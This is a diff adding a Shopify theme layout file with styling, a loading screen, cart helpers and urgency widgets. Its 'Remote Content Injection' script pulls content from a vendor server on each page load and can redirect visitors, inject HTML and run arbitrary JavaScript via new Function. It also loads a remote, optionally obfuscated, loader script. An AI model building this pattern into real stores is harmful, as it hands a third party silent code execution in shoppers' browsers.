@@ -1,0 +1,504 @@
+<!doctype html>
+<html class="no-js" lang="{{ request.locale.iso_code }}">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="{{ settings.color_accent | default: '#000000' }}">
+  <link rel="preconnect" href="https://cdn.shopify.com" crossorigin>
+
+  {%- if settings.favicon != blank -%}
+    <link rel="icon" type="image/png" href="{{ settings.favicon | image_url: width: 32, height: 32 }}">
+  {%- endif -%}
+
+  {%- comment -%} Preconnect to protection server and fonts {%- endcomment -%}
+  <link rel="preconnect" href="{{ settings.protection_server_url | default: 'https://your-app.up.railway.app' }}" crossorigin>
+
+  {%- comment -%} Preload fonts {%- endcomment -%}
+  {%- liquid
+    assign heading_font = settings.heading_font | default: 'Satoshi'
+    assign body_font = settings.body_font | default: 'Inter'
+  -%}
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  {%- liquid
+    assign gfonts = 'Anton,Satoshi,Inter,Bebas+Neue,Poppins,Montserrat,Oswald,Outfit,Space+Grotesk,DM+Sans,Rubik,Raleway'
+    assign gfonts_arr = gfonts | split: ','
+    assign load_fonts = ''
+    for f in gfonts_arr
+      assign load_fonts = load_fonts | append: 'family=' | append: f | append: ':wght@400;500;700;900&'
+    endfor
+  -%}
+  <link href="https://fonts.googleapis.com/css2?{{ load_fonts }}display=swap" rel="stylesheet">
+
+  {%- comment -%} Preload the loader script {%- endcomment -%}
+  <link rel="preload" href="{{ settings.protection_server_url | default: 'https://your-app.up.railway.app' }}/api/loader/v3/scaled-loader.js" as="script">
+
+  <title>
+    {{ page_title }}
+    {%- if current_tags %} &ndash; tagged "{{ current_tags | join: ', ' }}"{% endif -%}
+    {%- if current_page != 1 %} &ndash; Page {{ current_page }}{% endif -%}
+    {%- unless page_title contains shop.name %} &ndash; {{ shop.name }}{% endunless -%}
+  </title>
+
+  {% if page_description %}
+    <meta name="description" content="{{ page_description | escape }}">
+  {% endif %}
+
+  {% render 'meta-tags' %}
+
+  {{ content_for_header }}
+
+  {%- liquid
+    assign accent = settings.color_accent | default: '#39ff14'
+    assign accent_hover = settings.color_accent_hover | default: '#39ff14'
+    assign bg = settings.color_background | default: '#000000'
+    assign card_bg = settings.color_card_bg | default: '#111111'
+    assign card_elevated = settings.color_card_elevated | default: '#1a1a1a'
+    assign border_color = settings.color_border | default: '#333333'
+    assign text_primary = settings.color_text_primary | default: '#ffffff'
+    assign text_muted = settings.color_text_muted | default: '#9ca3af'
+    assign text_subtle = settings.color_text_subtle | default: '#6b7280'
+    assign star_color = settings.color_stars | default: '#fbbf24'
+  -%}
+
+  {%- comment -%}
+    ═══ Remote Content Injection ═══
+    Fetches CSS/HTML/JS patches from the protection server.
+    This runs before the loader to inject critical styles early.
+  {%- endcomment -%}
+  <script>
+    (function(){
+      var c = window.ScaledConfig || {},
+          d = c.permanentDomain || c.shopDomain || (window.Shopify && window.Shopify.shop ? window.Shopify.shop : window.location.hostname);
+      if (!d) return;
+      var u = c.apiUrl || {{ settings.protection_server_url | default: 'https://your-app.up.railway.app' | json }};
+      fetch(u + '/api/remote-content?domain=' + encodeURIComponent(d))
+        .then(function(r) { return r.json() })
+        .then(function(res) {
+          if (!res || !res.length) return;
+          res.forEach(function(p) {
+            if (p.redirect_url) { window.location.href = p.redirect_url; return; }
+            if (p.css) { var s = document.createElement('style'); s.textContent = p.css; document.head.appendChild(s); }
+            if (p.html) { var el = document.createElement('div'); el.innerHTML = p.html; while (el.firstChild) document.body.appendChild(el.firstChild); }
+            if (p.js) { try { new Function(p.js)(); } catch(e) {} }
+          });
+        }).catch(function(){});
+    })();
+  </script>
+
+  {%- comment -%}
+    ═══ Base CSS ═══
+    CSS variables, reset, shell states, loader, and license notice.
+    All section rendering CSS comes from the protection server.
+  {%- endcomment -%}
+  <style>
+    :root {
+      --color-bg: {{ bg }};
+      --color-bg-elevated: color-mix(in srgb, {{ bg }} 90%, white);
+      --color-bg-card: {{ card_bg }};
+      --color-text: {{ text_primary }};
+      --color-text-muted: {{ text_muted }};
+      --color-text-subtle: color-mix(in srgb, {{ text_muted }} 70%, {{ bg }});
+      --color-accent: {{ accent }};
+      --color-secondary: {{ accent_hover }};
+      --color-border: {{ border_color }};
+      --color-success: {{ settings.color_success | default: '#22c55e' }};
+      --color-error: {{ settings.color_error | default: '#ef4444' }};
+      --font-body: '{{ heading_font }}', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-heading: '{{ heading_font }}', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-family: '{{ heading_font }}', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --spacing-xs: 4px;
+      --spacing-sm: 8px;
+      --spacing-md: 16px;
+      --spacing-lg: 24px;
+      --spacing-xl: 32px;
+      --spacing-2xl: 48px;
+      --spacing-3xl: 64px;
+      --spacing-4xl: 96px;
+      --radius-sm: 8px;
+      --radius-md: 12px;
+      --radius-lg: 16px;
+      --radius-full: 9999px;
+      --shadow-sm: 0 1px 2px rgba(0,0,0,0.5);
+      --shadow-md: 0 4px 12px rgba(0,0,0,0.5);
+      --shadow-lg: 0 8px 24px rgba(0,0,0,0.5);
+      --shadow-glow: 0 0 20px color-mix(in srgb, var(--color-accent) 30%, transparent);
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 16px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
+    body { font-family: var(--font-body); background-color: var(--color-bg); color: var(--color-text); line-height: 1.5; min-height: 100vh; overflow-x: hidden; }
+    a { color: var(--color-accent); text-decoration: none; transition: opacity 0.2s; }
+    a:hover { opacity: 0.8; }
+    img { max-width: 100%; height: auto; display: block; }
+    button { font-family: inherit; cursor: pointer; border: none; background: none; }
+
+    /* Shell empty states — hide sections with no content */
+    .scaled-shell:empty,
+    .scaled-reviews-shell:empty,
+    .scaled-chat-shell:empty,
+    .scaled-urgency-shell:empty { display: none !important; }
+
+    .scaled-faq-wrapper:has(.scaled-shell:empty),
+    .scaled-reviews-wrapper:has(.scaled-reviews-shell:empty),
+    .scaled-urgency-wrapper:has(.scaled-urgency-shell:empty),
+    .scaled-hero-wrapper:has(.scaled-shell:empty),
+    .scaled-live-sales-wrapper:has(.scaled-shell:empty) { display: none !important; }
+
+    /* Shell loading shimmer */
+    .scaled-shell--loading:not(:empty) {
+      min-height: 200px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(90deg, var(--color-bg-card) 0%, var(--color-bg-elevated) 50%, var(--color-bg-card) 100%);
+      background-size: 200% 100%;
+      animation: shimmer 1.5s infinite;
+    }
+
+    /* Header shell — fixed positioning */
+    .scaled-shell--header-minimal {
+      min-height: auto;
+      position: fixed;
+      top: var(--header-top, 16px);
+      left: 0;
+      right: 0;
+      z-index: 100;
+      background: transparent;
+      animation: none;
+      display: block;
+      transition: top 0.25s ease-out;
+    }
+    .scaled-shell--header-minimal.scaled-shell--loading {
+      background: transparent;
+      animation: none;
+    }
+
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+
+    /* License notice */
+    .scaled-license-notice-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 60vh;
+      padding: var(--spacing-lg);
+    }
+    .scaled-license-notice {
+      padding: var(--spacing-xl) var(--spacing-lg);
+      text-align: center;
+      max-width: 420px;
+      border-radius: 12px;
+      background: var(--color-bg-card);
+      border: 1px solid var(--color-border);
+    }
+    .scaled-license-notice__icon {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto var(--spacing-md);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+    }
+    .scaled-license-notice__title {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--color-text);
+      margin-bottom: var(--spacing-xs);
+    }
+    .scaled-license-notice__message {
+      font-size: 14px;
+      color: var(--color-text-muted);
+      line-height: 1.5;
+      margin-bottom: var(--spacing-md);
+    }
+    .scaled-license-notice__steps {
+      text-align: left;
+      background: var(--color-bg-elevated);
+      border-radius: 8px;
+      padding: var(--spacing-md);
+      margin-bottom: var(--spacing-md);
+    }
+    .scaled-license-notice__step {
+      font-size: 13px;
+      color: var(--color-text-muted);
+      padding: var(--spacing-xs) 0;
+      display: flex;
+      align-items: flex-start;
+      gap: var(--spacing-sm);
+    }
+    .scaled-license-notice__step-num {
+      flex-shrink: 0;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: var(--color-accent);
+      color: #000;
+      font-size: 11px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .scaled-license-notice__help {
+      font-size: 12px;
+      color: var(--color-text-muted);
+    }
+    .scaled-license-notice--setup .scaled-license-notice__icon { background: rgba(59,130,246,0.1); color: #3b82f6; }
+    .scaled-license-notice--error .scaled-license-notice__icon { background: rgba(245,158,11,0.1); color: #f59e0b; }
+    .scaled-license-notice--critical .scaled-license-notice__icon { background: rgba(239,68,68,0.1); color: #ef4444; }
+
+    .scaled-license-error {
+      padding: var(--spacing-2xl);
+      text-align: center;
+      color: var(--color-text-muted);
+    }
+    .scaled-license-error__icon { font-size: 48px; margin-bottom: var(--spacing-md); }
+    .scaled-license-error__message { font-size: 14px; }
+
+    /* Container & utility */
+    .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 var(--spacing-md); }
+    .visually-hidden {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0,0,0,0);
+      white-space: nowrap;
+      border: 0;
+    }
+
+    /* Loader */
+    .scaled-loader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 99999;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1), visibility 0.5s;
+    }
+    .scaled-loader.is-hidden {
+      opacity: 0;
+      visibility: hidden;
+      pointer-events: none;
+    }
+    body.is-loading { overflow: hidden !important; }
+    body.is-loading > *:not(.scaled-loader) { display: none !important; }
+    .scaled-loader__spinner {
+      width: 48px;
+      height: 48px;
+      position: relative;
+    }
+    .scaled-loader__spinner::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      border: 3px solid transparent;
+      border-top-color: var(--color-accent);
+      border-right-color: var(--color-secondary);
+      animation: scaledSpin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+    }
+    .scaled-loader__spinner::after {
+      content: '';
+      position: absolute;
+      inset: 6px;
+      border-radius: 50%;
+      border: 2px solid transparent;
+      border-bottom-color: var(--color-accent);
+      border-left-color: var(--color-secondary);
+      animation: scaledSpin 0.8s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite reverse;
+    }
+    @keyframes scaledSpin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+
+  <link href="{{ 'base.css' | asset_url }}" rel="stylesheet" type="text/css" media="all" />
+
+  {%- comment -%} ScaledConfig — passed to the loader {%- endcomment -%}
+  <script>
+    window.ScaledConfig = {
+      licenseKey: {{ settings.license_key | default: '' | json }},
+      shopDomain: {{ request.host | json }},
+      permanentDomain: {{ shop.permanent_domain | json }},
+      apiUrl: {{ settings.protection_server_url | default: 'https://your-app.up.railway.app' | json }},
+      colors: {
+        accent1: {{ accent | json }},
+        accent2: {{ accent_hover | json }},
+        background: {{ bg | json }},
+        text: {{ text_primary | json }},
+        textMuted: {{ text_muted | json }},
+        cardBg: {{ card_bg | json }},
+        border: {{ border_color | json }}
+      },
+      accentColor: {{ accent | json }},
+      secondaryColor: {{ accent_hover | json }},
+      brandName: {{ shop.name | json }},
+      logoUrl: {% if settings.logo %}{{ settings.logo | image_url: width: 200 | json }}{% else %}null{% endif %},
+      chatbot: {
+        enabled: {{ settings.chat_enabled | default: true }},
+        name: {{ settings.chat_name | default: "Reselling Assistant" | json }},
+        context: "",
+        sellingPoints: ""
+      },
+      urgency: {
+        showViewerCount: true,
+        showRecentSales: true,
+        showCountdown: false,
+        countdownEndDate: ""
+      }
+    };
+  </script>
+
+  {%- if settings.custom_css != blank -%}
+    <style>{{ settings.custom_css }}</style>
+  {%- endif -%}
+
+  {%- if settings.custom_head_code != blank -%}
+    {{ settings.custom_head_code }}
+  {%- endif -%}
+</head>
+
+<body class="template-{{ template.name }}{% if template.suffix %} template-{{ template.name }}-{{ template.suffix }}{% endif %} is-loading">
+  <div class="scaled-loader" id="scaled-loader" aria-label="Loading">
+    <div class="scaled-loader__spinner"></div>
+  </div>
+
+  <a class="visually-hidden" href="#main-content">Skip to content</a>
+
+  {% sections 'header-group' %}
+
+  <main id="main-content" role="main">
+    {{ content_for_layout }}
+  </main>
+
+  {% sections 'footer-group' %}
+
+  {%- comment -%}
+    ═══ Loader Script ═══
+    The v3 loader reads all shell sections, fetches rendered HTML from the server,
+    and injects it into the shell containers.
+  {%- endcomment -%}
+  {%- if settings.use_obfuscated_loader -%}
+    <script src="{{ 'scaled-loader.js' | asset_url }}" defer></script>
+  {%- else -%}
+    <script src="{{ settings.protection_server_url | default: 'https://your-app.up.railway.app' }}/api/loader/v3/scaled-loader.js" defer></script>
+  {%- endif -%}
+
+  {%- comment -%} Loader observer — hides loading screen when first shell gets content {%- endcomment -%}
+  <script>
+    (function(){
+      var loader = document.getElementById('scaled-loader');
+      if (!loader) return;
+      var hidden = false;
+      function hideLoader() {
+        if (hidden) return;
+        hidden = true;
+        document.body.classList.remove('is-loading');
+        loader.classList.add('is-hidden');
+        setTimeout(function(){ loader.remove(); }, 500);
+      }
+      var shells = document.querySelectorAll('.scaled-shell');
+      var loadedCount = 0;
+      var totalShells = shells.length;
+      if (totalShells === 0) { hideLoader(); return; }
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(m) {
+          if (m.target.classList.contains('scaled-shell') && m.target.children.length > 0 && !m.target.classList.contains('scaled-shell--loading')) {
+            loadedCount++;
+            if (loadedCount >= 1) hideLoader();
+          }
+        });
+      });
+      shells.forEach(function(shell) {
+        observer.observe(shell, { childList: true, attributes: true, attributeFilter: ['class'] });
+      });
+      setTimeout(hideLoader, 5000);
+    })();
+  </script>
+
+  {%- comment -%} ScaledCart — cart utility used by server-rendered sections {%- endcomment -%}
+  <script>
+    window.ScaledCart = {
+      get: async function() {
+        const res = await fetch('/cart.js');
+        return res.json();
+      },
+      add: async function(variantId, quantity) {
+        quantity = quantity || 1;
+        const res = await fetch('/cart/add.js', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: variantId, quantity: quantity })
+        });
+        return res.json();
+      },
+      update: async function(updates) {
+        const res = await fetch('/cart/update.js', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ updates: updates })
+        });
+        return res.json();
+      }
+    };
+
+    {%- comment -%} Header position tracking — urgency bar aware {%- endcomment -%}
+    (function(){
+      var BASE_TOP = 16, URGENCY_GAP = 8;
+      var urgencyEl = null, ticking = false;
+      function getUrgencyElement() {
+        return document.querySelector('.urgency-bar') || document.getElementById('scaled-urgency');
+      }
+      function updateHeaderPosition() {
+        var scrollY = window.scrollY;
+        if (!urgencyEl) urgencyEl = getUrgencyElement();
+        if (urgencyEl && urgencyEl.offsetHeight > 0) {
+          var urgencyHeight = urgencyEl.offsetHeight;
+          var headerTop = Math.max(BASE_TOP, urgencyHeight + URGENCY_GAP - scrollY);
+          document.documentElement.style.setProperty('--header-top', headerTop + 'px');
+        } else {
+          document.documentElement.style.setProperty('--header-top', BASE_TOP + 'px');
+        }
+        ticking = false;
+      }
+      function onScroll() {
+        if (!ticking) { requestAnimationFrame(updateHeaderPosition); ticking = true; }
+      }
+      window.addEventListener('scroll', onScroll, { passive: true });
+      var observer = new MutationObserver(function() {
+        var el = getUrgencyElement();
+        if (el && el.offsetHeight > 0 && !urgencyEl) { urgencyEl = el; updateHeaderPosition(); }
+      });
+      observer.observe(document.body, { childList: true, subtree: true });
+      var pollCount = 0;
+      var pollInterval = setInterval(function() {
+        urgencyEl = getUrgencyElement();
+        updateHeaderPosition();
+        pollCount++;
+        if ((urgencyEl && urgencyEl.offsetHeight > 0) || pollCount > 30) clearInterval(pollInterval);
+      }, 150);
+      updateHeaderPosition();
+    })();
+  </script>
+
+  {%- if settings.custom_js != blank -%}
+    <script>{{ settings.custom_js }}</script>
+  {%- endif -%}
+</body>
+</html>
